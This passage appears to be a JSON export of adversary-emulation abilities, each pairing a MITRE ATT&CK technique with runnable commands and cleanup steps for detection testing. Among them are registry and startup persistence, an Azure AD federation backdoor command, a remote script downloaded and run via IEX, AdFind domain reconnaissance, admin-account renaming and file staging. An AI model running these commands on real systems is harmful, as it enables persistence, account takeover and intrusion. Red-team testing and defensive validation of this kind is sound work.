https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "4bfb5f265a5ce07af6bf10da113af7db", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Activate Windows NoTrayContextMenu Group Policy Feature", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "1f15ab22c39a9b6bb2bb0d77276dfcb3", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Add Executable Shortcut Link to User Startup Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a new federated domain to Azure AD using PowerShell.\nThe malicious domain to be federated must be configured beforehand (outside of the scope of this test):\n    1. Open Azure Portal\n    2. Add a new \"custom domain name\"\n    3. Verify the domain by following instructions (i.e. create the requested DNS record)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try {;   Import-Module AzureAD -ErrorAction Ignore;   $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword;   Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null;   Remove-AzureADDomain -Name \"contoso.com\" -ErrorAction Ignore; } catch {}"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module AzureAD; Import-Module AADInternals; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword; try {;   Connect-AzureAD -Credential $Credential -ErrorAction Stop > $null; }; catch {;   Write-Host \"Error: AzureAD could not connect\";   exit 1; }; try {;   $domain = Get-AzureADDomain -Name \"contoso.com\"; }; catch {;   Write-Host \"Error: domain \"\"contoso.com\"\" not found\";   exit 1; }; if (-Not $domain.IsVerified) {;   Write-Host \"Error: domain \"\"contoso.com\"\" not verified\";   exit 1; }; if ($domain.AuthenticationType -eq \"Federated\") {;   Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\";   exit 1; }; $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential; if (-Not $at) {;   Write-Host \"Error: AADInternals could not connect\";   exit 1; }; $new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"; if ($new) {;   Write-Host \"Federation successfully added to Azure AD\";   Write-Host $new; }; else {;   Write-Host \"The federation setup failed\"; }; Write-Host \"End of federation configuration.\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Domain Trust Modification", "ability_id": "776315112cd7318c4afd38f7847465fb", "technique_id": "T1484.002", "tactic": "multiple", "requirements": [], "name": "Add Federation to Azure AD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a Network Share utilizing the command_prompt\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net use c: \\\\test\\share && net share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "ability_id": "3acf5046708b8ad68ecb7aeacbdd8d14", "technique_id": "T1070.005", "tactic": "defense-evasion", "requirements": [], "name": "Add Network Share", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add key-value pair to a Windows Port Monitor registry. On the subsequent reboot DLL will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["dba276_PortMonitor.dll"], "parsers": [], "cleanup": ["reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"dba276_PortMonitor.dll\" /t REG_SZ", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Port Monitors", "ability_id": "9cfb8e47dd14ee8f6d44afeaa294bab1", "technique_id": "T1547.010", "tactic": "multiple", "requirements": [], "name": "Add Port Monitor persistence in Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Subvert Trust Controls: Install Root Certificate", "ability_id": "9d21f3b551b40fa40056af1244af56ee", "technique_id": "T1553.004", "tactic": "defense-evasion", "requirements": [], "name": "Add Root Certificate to CurrentUser Certificate Store", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Install a driver via pnputil.exe lolbin\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution", "ability_id": "5bf05600c43ae20df8e0723ce2c3c30b", "technique_id": "T1547", "tactic": "multiple", "requirements": [], "name": "Add a driver", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the current/new user will be added to the Admin group", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["dseditgroup -o edit -d art-user -t user admin"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dseditgroup -o edit -a art-user -t user admin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "7cdbf13211f9012f4192405636a97e20", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Add a new/existing user to the admin group using dseditgroup utility - macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["{ echo y; echo response; } | ufw delete 1; ufw status numbered"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ufw prepend deny from 1.2.3.4; ufw status numbered", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "3939013428dfc0bc10825755685849c2", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Add and delete UFW firewall rules", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a malicous bookmark which looks like a current one", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["bookmark.scpt"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: AppleScript", "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb", "technique_id": "T1059.002", "tactic": "execution", "requirements": [], "name": "Add bookmark", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adds a command to the .bash_profile file of the current user\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["head -n '-2' ~/.bash_profile > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bash_profile"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["head -n '-2' ~/.bash_profile > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bash_profile"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "f46fcebae29a2bde63127a3bcee47d23", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "Add command to .bash_profile", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adds a command to the .bashrc file of the current user\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["head -n '-2' ~/.bashrc > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bashrc"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["head -n '-2' ~/.bashrc > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bashrc"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "78c03eac53060523b4eef3ad473d218c", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "Add command to .bashrc", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; Remove-item  $key -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"; $name =\"bad-subdomain\"; new-item $key -Name $name -Force; new-itemproperty $key$name -Name https -Value 2 -Type DWORD; new-itemproperty $key$name -Name http  -Value 2 -Type DWORD; new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "7a6e495200cd37c66f02e7bc070b61a9", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Add domain to Trusted sites Zone", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /Library/StartupItems/EvilStartup.plist"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo touch /Library/StartupItems/EvilStartup.plist", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Initialization Scripts: Startup Items", "ability_id": "61fddd16aa5019ccc7e5440fc1be4dfc", "technique_id": "T1037.005", "tactic": "multiple", "requirements": [], "name": "Add file to Local Library StartupItems", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["998e96_add_login_item.osa", "04f33d_remove_login_item.osa"], "parsers": [], "cleanup": ["osascript 04f33d_remove_login_item.osa"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "osascript 998e96_add_login_item.osa", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Login Items", "ability_id": "244cd00410232659c0098f9ad4b9da2a", "technique_id": "T1547.015", "tactic": "multiple", "requirements": [], "name": "Add macOS LoginItem using Applescript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "apt install xclip -y; history | tail -n 30 | xclip -sel clip; xclip -o > history.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "dca411f2ebdac351c96959066ac30a68", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Add or copy content to clipboard with xClip", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "0dbdf1a2a87e718a6ac8a8e3415a7fac", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Add persistance via Recycle bin", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -sc admincountdmp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "fcef063a231fb18e8a4b87f96a97fd5b", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Admins", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -f (objectcategory=computer)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "02f9ca082a6b35c0a753ce362dfea6f2", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Computer Objects", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -sc dclist", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "c8fa438e6b9728cf7fa05dfd4a80b2f3", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Domain Controller Objects", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -sc exchaddresses", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "28533078a7bb86154fcb6d2236fe59b4", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Exchange AD Objects", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -f (objectcategory=organizationalUnit)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "ef70c2665d6e37720964fcd4f38c5ec8", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory OUs", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -f (objectcategory=subnet)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "fb491bb831fbb5d3dcd96c92a1aa1700", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Subnet Objects", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -gcb -sc trustdmp", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "097bbd452cdc6506e728287c7084333f", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory Trusts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -f (objectcategory=person)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "157278cc77e4503c58945cec5129f566", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Adfind - Enumerate Active Directory User Objects", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "#{adfind_path} -f (objectcategory=group)", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "856ccc398377c9404685983bc04dabb2", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Adfind - Query Active Directory Groups", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["12011c_AdFind.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "12011c_AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "e2b2740289f34f77d74720f5c9edce3b", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Adfind -Listing password policy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Manipulate Admin Account Name\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$list = Get-LocalUser |?{$_.Description -like \"atr:*\"}; foreach($u in $list) {;   $u.Description -match \"atr:(?<Name>[^;]+);(?<Description>.*)\";   Set-LocalUser -Name $u.Name -Description $Matches.Description;   Rename-LocalUser -Name $u.Name -NewName $Matches.Name;   Write-Host \"Successfully Reverted Account $($u.Name) to $($Matches.Name) on \" $Env:COMPUTERNAME; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$x = Get-Random -Minimum 2 -Maximum 9999; $y = Get-Random -Minimum 2 -Maximum 9999; $z = Get-Random -Minimum 2 -Maximum 9999; $w = Get-Random -Minimum 2 -Maximum 9999; Write-Host HaHa_$x$y$z; $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name; foreach($member in $fmm) {;     if($member -like \"*Administrator*\") {;         $account = $member.Name -replace \".+\\\\\\\",\"\";         $originalDescription = (Get-LocalUser -Name $account).Description;         Set-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48);         Rename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\";         Write-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME;         };     }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "778e76984e52af739eff58d6cce22f42", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Admin Account Manipulate", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["file_search.ps1"], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.staged"}]}], "cleanup": ["if ('#{windows.staging.location}' -match \"recycle[``|\\s]+bin\") {\n       $sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value;\n       $StageDir = \"C:\\`$Recycle.Bin\\$sid\\s\";\n} else { $StageDir = 